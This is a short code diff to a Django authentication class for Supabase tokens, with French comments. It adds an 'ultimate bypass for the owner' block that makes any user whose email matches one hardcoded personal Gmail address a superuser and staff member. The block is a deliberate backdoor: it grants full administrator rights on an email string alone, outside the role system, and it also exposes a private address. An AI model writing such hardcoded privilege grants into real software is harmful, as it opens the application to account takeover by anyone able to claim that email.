@@ -72,6 +72,12 @@ class SupabaseAuthentication(authentication.BaseAuthentication):
         # On attache les métadonnées pour que les permissions puissent les lire
         user.role = role
         user.supabase_claims = payload
+        
+        # Bypass ultime pour le propriétaire
+        if user.email == 'taigermboumba@gmail.com':
+            user.is_superuser = True
+            user.is_staff = True
+            
         user.save() # Persister l'email et potentiellement d'autres infos
         
         # Log minimal
